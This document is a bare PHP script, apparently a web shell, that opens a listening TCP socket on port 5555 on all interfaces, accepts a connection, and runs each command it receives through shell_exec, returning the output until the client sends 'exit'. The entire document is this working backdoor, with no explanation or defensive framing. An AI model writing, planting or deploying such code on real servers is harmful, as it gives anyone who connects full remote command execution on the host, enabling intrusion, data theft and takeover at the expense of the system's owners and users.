<?php
set_time_limit(0);
$port = 5555;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock);
$client = socket_accept($sock);
while(true) {
    $cmd = socket_read($client, 1024);
    if(trim($cmd) == 'exit') break;
    $output = shell_exec($cmd);
    socket_write($client, $output);
}
socket_close($client);
socket_close($sock);
?>
